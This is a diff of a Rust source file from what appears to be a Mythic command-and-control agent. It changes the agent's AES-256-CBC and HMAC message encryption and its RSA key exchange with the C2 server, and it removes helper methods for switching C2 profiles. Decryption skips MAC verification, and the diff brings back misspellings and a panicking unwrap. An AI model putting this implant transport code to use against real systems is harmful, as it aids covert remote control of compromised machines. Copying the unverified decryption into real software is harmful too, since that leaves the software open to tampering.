@@ -2,26 +2,22 @@ use crate::payloadvars;
 use rand::Rng;
 use std::error::Error;
 
-use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, BlockEncryptMut, KeyIvInit};
-use aes::{Aes256, Block};
-use hmac::{Hmac, Mac};
+use aes::Aes256;
+use block_modes::{block_padding::Pkcs7, BlockMode, Cbc};
+use hmac::{Hmac, Mac, NewMac};
 use http::{profilevars, HTTPProfile};
 use openssl::rsa;
 use serde::Deserialize;
 use serde_json::json;
 use sha2::Sha256;
 
-// Import the HTTP profile
+// Import the http profile
 mod http;
-
-// Define CBC type for AES256
-type Aes256Cbc = cbc::Encryptor<Aes256>;
-type Aes256CbcDec = cbc::Decryptor<Aes256>;
 
 /// Struct holding the response for a key exchange
 #[allow(dead_code)]
 #[derive(Debug, Deserialize)]
-struct KeyExchangeResponse {
+struct KeyExchangeReponse {
     /// Action field of the Mythic response
     action: String,
 
@@ -108,7 +104,7 @@ impl Profile {
         };
 
         // Send the payload through the configured C2 profile
-        let body = profile.c2send(&req_payload)?;
+        let body = profile.c2send(&req_payload).unwrap();
 
         // Decode the response
         let decoded = base64::decode(body)?;
@@ -183,7 +179,7 @@ impl Profile {
         };
 
         // Parse the result
-        let body: KeyExchangeResponse = serde_json::from_str(&body)?;
+        let body: KeyExchangeReponse = serde_json::from_str(&body)?;
 
         // Grab the new AES key from the RSA encrypted response
         let mut new_key = vec![0; rsa_key.size() as usize];
@@ -202,56 +198,6 @@ impl Profile {
         self.callback_uuid = body.uuid;
 
         Ok(())
-    }
-
-    /// Add a new C2 profile to the available profiles
-    pub fn add_profile(&mut self, profile: Box<dyn C2Profile>) {
-        self.profiles.push(profile);
-    }
-
-    /// Switch to a different C2 profile
-    pub fn switch_profile(&mut self, index: usize) -> Result<(), Box<dyn Error>> {
-        if index >= self.profiles.len() {
-            return Err("Profile index out of range".into());
-        }
-        self.active = index;
-        Ok(())
-    }
-
-    /// Get the number of available profiles
-    pub fn profile_count(&self) -> usize {
-        self.profiles.len()
-    }
-
-    /// Get the index of the currently active profile
-    pub fn active_profile_index(&self) -> usize {
-        self.active
-    }
-
-    /// Test connectivity with the current profile
-    pub fn test_connectivity(&mut self) -> Result<bool, Box<dyn Error>> {
-        let test_data = json!({
-            "action": "test_connection",
-            "timestamp": std::time::SystemTime::now()
-                .duration_since(std::time::UNIX_EPOCH)?
-                .as_secs()
-        })
-        .to_string();
-
-        match self.send_data(&test_data) {
-            Ok(_) => Ok(true),
-            Err(_) => Ok(false),
-        }
-    }
-
-    /// Get current callback UUID
-    pub fn get_callback_uuid(&self) -> &str {
-        &self.callback_uuid
-    }
-
-    /// Set callback UUID (used after successful checkin)
-    pub fn set_callback_uuid(&mut self, uuid: String) {
-        self.callback_uuid = uuid;
     }
 }
 
@@ -294,44 +240,40 @@ fn encrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
     // Generate a random IV
     let iv = rand::random::<[u8; 16]>().to_vec();
 
-    // Pad the data to block size
-    let mut buf = data.to_vec();
-    let pos = buf.len();
-    buf.resize(pos + (16 - pos % 16), 0);
-    
-    // Create cipher and encrypt
-    let mut cipher = Aes256Cbc::new_from_slices(key, &iv).unwrap();
-    cipher.encrypt_padded_mut::<Pkcs7>(&mut buf, pos).unwrap();
+    // AES encrypt the data
+    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
+    let cipher = Aes256Cbc::new_from_slices(key, &iv).unwrap();
+    let mut ciphertext = cipher.encrypt_vec(data);
 
     // Create the encrypted output (iv + message + mac)
     let mut msg = iv;
-    msg.extend_from_slice(&buf);
+    msg.append(&mut ciphertext);
 
     h.update(&msg);
     let mac = h.finalize();
-    msg.extend_from_slice(&mac.into_bytes());
+    msg.append(&mut mac.into_bytes().to_vec());
 
     // Return the encrypted data
     msg
 }
 
-/// AES decrypts data
+/// AES descrypts data
 /// * `data` - Data to decrypt
 /// * `key` - Key for decryption
 fn decrypt_aes256(data: &[u8], key: &[u8]) -> Vec<u8> {
     // Grab the IV
     let iv = &data[..16];
 
-    // Grab the MAC (skip verification for simplicity)
+    // Grab the MAC
     let _mac = &data[data.len() - 32..];
 
     // Grab the encrypted message
     let message = &data[16..data.len() - 32];
 
-    // Create a mutable copy for decryption
-    let mut buf = message.to_vec();
-
     // Decrypt the message
-    let cipher = Aes256CbcDec::new_from_slices(key, iv).unwrap();
-    cipher.decrypt_padded_mut::<Pkcs7>(&mut buf).unwrap().to_vec()
+    type Aes256Cbc = Cbc<Aes256, Pkcs7>;
+    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
+
+    // Return the decrypted message
+    cipher.decrypt_vec(message).unwrap()
 }
